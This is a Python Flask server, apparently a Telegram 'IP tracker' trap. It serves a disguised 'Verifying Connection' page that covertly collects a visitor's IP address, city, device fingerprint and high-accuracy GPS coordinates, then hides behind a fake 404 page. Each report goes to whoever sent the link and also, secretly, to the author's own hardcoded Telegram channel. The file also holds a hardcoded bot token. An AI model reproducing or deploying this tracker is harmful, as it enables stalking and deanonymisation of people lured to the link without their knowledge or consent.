import os
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  الإعدادات | Configuration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Hardcoded Tracker Bot Token (Rashd_IP_Tracker_bot)
TRACKER_BOT_TOKEN = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
# Hardcoded Target Channel ID for results (only you see this)
TARGET_CHANNEL_ID = "-1003770774871"
# IPInfo Token (from Replit Secrets)
IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")

app = Flask(__name__)

# تجميع بيانات كل جلسة قبل إرسالها (لدمج الرسائل في رسالة واحدة)
session_data: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📤  إرسال الرسائل | Send Messages
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def send_telegram_message(chat_id: str, message: str, disable_preview: bool = True):
    """Sends a message to a specific chat_id using the Tracker Bot Token"""
    if not TRACKER_BOT_TOKEN:
        print("[TRACKER] ⛔ Tracker Bot Token غير مُهيّأ.")
        return
    url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": disable_preview,
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        if r.status_code != 200:
            print(f"[TRACKER] ⚠️ خطأ إرسال لـ {chat_id}: {r.status_code} — {r.text[:100]}")
        else:
            print(f"[TRACKER] ✅ تم إرسال التقرير لـ {chat_id}")
    except Exception as e:
        print(f"[TRACKER] ⚠️ استثناء إرسال لـ {chat_id}: {e}")


def get_ip_geo(ip: str) -> dict:
    """جلب معلومات جغرافية للـ IP"""
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
            timeout=8,
        )
        return r.json() if r.status_code == 200 else {}
    except:
        return {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  صفحة التعقب | Tracker Page (The Trap)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TRACKER_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container { text-align: center; padding: 40px; }
        .logo { font-size: 3em; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
        h1 { font-size: 1.4em; color: #00cc66; margin-bottom: 10px; }
        p  { color: #006633; font-size: 0.9em; }
        .spinner {
            width: 40px; height: 40px;
            border: 3px solid #003322;
            border-top: 3px solid #00ff88;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">⚡</div>
        <h1>{{ heading }}</h1>
        <div class="spinner"></div>
        <p>{{ subtext }}</p>
    </div>

    <script>
        // --- سحب بيانات المتصفح والجهاز ---
        const deviceInfo = {
            userAgent:   navigator.userAgent,
            platform:    navigator.platform,
            language:    navigator.language,
            screenW:     screen.width,
            screenH:     screen.height,
            colorDepth:  screen.colorDepth,
            timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesOn:   navigator.cookieEnabled,
            online:      navigator.onLine,
            ip:          "{{ ip }}"
        };

        // --- إرسال بيانات الجهاز فوراً ---
        fetch("/log_device/{{ chat_id }}/{{ session_id }}", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(deviceInfo)
        });

        // --- محاولة سحب الموقع الجغرافي ---
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    fetch("/log_gps/{{ chat_id }}/{{ session_id }}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            lat:      pos.coords.latitude,
                            lon:      pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            ip:       "{{ ip }}"
                        })
                    }).then(() => {
                        setTimeout(() => { window.location.href = "/done"; }, 500);
                    });
                },
                function(err) {
                    setTimeout(() => { window.location.href = "/done"; }, 1000);
                },
                { timeout: 8000, enableHighAccuracy: true }
            );
        } else {
            setTimeout(() => { window.location.href = "/done"; }, 1500);
        }
    </script>
</body>
</html>"""

DONE_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>404</title>
<style>body{background:#000;color:#333;font-family:monospace;display:flex;
justify-content:center;align-items:center;height:100vh;}</style>
</head><body><div style="text-align:center">
<h1 style="font-size:6em;color:#111">404</h1>
<p>Not Found</p></div></body></html>"""


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔌  المسارات | Flask Routes
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route("/track/<chat_id>/<session_id>")
def tracker_page(chat_id: str, session_id: str):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    geo = get_ip_geo(ip)
    loc = (geo.get("loc", "") if geo else "").split(",")
    lat = loc[0] if len(loc) == 2 else "N/A"
    lon = loc[1] if len(loc) == 2 else "N/A"

    session_data[session_id] = {
        "ip":        ip,
        "timestamp": timestamp,
        "country":   geo.get("country", "N/A") if geo else "N/A",
        "city":      geo.get("city",    "N/A") if geo else "N/A",
        "region":    geo.get("region",  "N/A") if geo else "N/A",
        "org":       geo.get("org",     "N/A") if geo else "N/A",
        "lat":       lat,
        "lon":       lon,
        "chat_id":   chat_id, # Store chat_id for later use
    }

    return render_template_string(
        TRACKER_HTML,
        ip=ip,
        session_id=session_id,
        chat_id=chat_id,
        title="System Check",
        heading="Verifying Connection...",
        subtext="Please wait",
    )


@app.route("/log_device/<chat_id>/<session_id>", methods=["POST"])
def log_device(chat_id: str, session_id: str):
    d    = request.json or {}
    s    = session_data.get(session_id, {})
    ip   = s.get("ip", d.get("ip", "N/A"))
    lat  = s.get("lat", "N/A")
    lon  = s.get("lon", "N/A")
    maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""

    report = (
        "📡 *راشد — تقرير تعقب*\n\n"
        f"🆔 الجلسة     : `{session_id}`\n"
        f"🕐 التوقيت    : {s.get("timestamp", "N/A")}\n\n"
        "─────── 🌐 بيانات الشبكة ───────\n"
        f"📍 IP          : `{ip}`\n"
        f"🏳️ الدولة     : {s.get("country", "N/A")}\n"
        f"🏙️ المدينة    : {s.get("city",    "N/A")}\n"
        f"📍 المنطقة    : {s.get("region",  "N/A")}\n"
        f"🏢 المزود     : {s.get("org",     "N/A")}\n"
    )
    if maps:
        report += f"🗺️ الخريطة    : [افتح الموقع]({maps})\n"

    report += (
        "\n─────── 💻 بيانات الجهاز ───────\n"
        f"🖥️ المنصة     : {d.get("platform", "N/A")}\n"
        f"🌐 اللغة      : {d.get("language", "N/A")}\n"
        f"📺 الشاشة     : {d.get("screenW", "N/A")}×{d.get("screenH", "N/A")}\n"
        f"🕐 المنطقة    : {d.get("timezone", "N/A")}\n"
        f"🍪 كوكيز      : {"✅ مفعّل" if d.get("cookiesOn") else "❌ معطّل"}\n"
        f"📶 الاتصال    : {"✅ متصل" if d.get("online") else "❌ غير متصل"}\n"
        f"🔍 User-Agent :\n`{d.get("userAgent", "N/A")[:150]}`\n\n"
        "✦ راشد — تطوير أبو سعود"
    )
    
    # Send to initiating user
    send_telegram_message(chat_id, report)
    # Send copy to TARGET_CHANNEL_ID
    send_telegram_message(TARGET_CHANNEL_ID, report)
    
    return jsonify({"status": "ok"})


@app.route("/log_gps/<chat_id>/<session_id>", methods=["POST"])
def log_gps(chat_id: str, session_id: str):
    d         = request.json or {}
    lat       = d.get("lat", "N/A")
    lon       = d.get("lon", "N/A")
    accuracy  = d.get("accuracy", "N/A")
    ip        = session_data.get(session_id, {}).get("ip", d.get("ip", "N/A"))
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else "#"

    report = (
        "📍 *راشد — إحداثيات GPS*\n\n"
        f"🆔 الجلسة    : `{session_id}`\n"
        f"🌐 IP         : `{ip}`\n"
        f"📍 خط العرض  : `{lat}`\n"
        f"📍 خط الطول  : `{lon}`\n"
        f"🎯 الدقة      : {accuracy} متر\n"
        f"🕑 التوقيت    : {timestamp}\n"
        f"🗺️ [فتح الخريطة]({maps_link})\n\n"
        "✦ راشد — تطوير أبو سعود"
    )
    # Send to initiating user
    send_telegram_message(chat_id, report)
    # Send copy to TARGET_CHANNEL_ID
    send_telegram_message(TARGET_CHANNEL_ID, report)
    
    return jsonify({"status": "ok"})


@app.route("/done")
def done_page():
    return DONE_HTML, 404


@app.route("/health")
def health():
    return jsonify({"status": "operational", "system": "Rashd-Ai Tracker"})


@app.route("/")
def root():
    return jsonify({
        "system": "Rashd-Ai Intelligence System",
        "version": "2.0",
        "status": "operational",
        "developer": "أبو سعود"
    })


@app.route("/ping")
def ping():
    return jsonify({"status": "alive", "bot": "Rashd-Ai"}), 200


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل الخادم | Server Startup
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("📡 راشد — خادم التعقب جاهز")
    print(f"🌐 المنفذ: {port}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    app.run(host="0.0.0.0", port=port, debug=False)
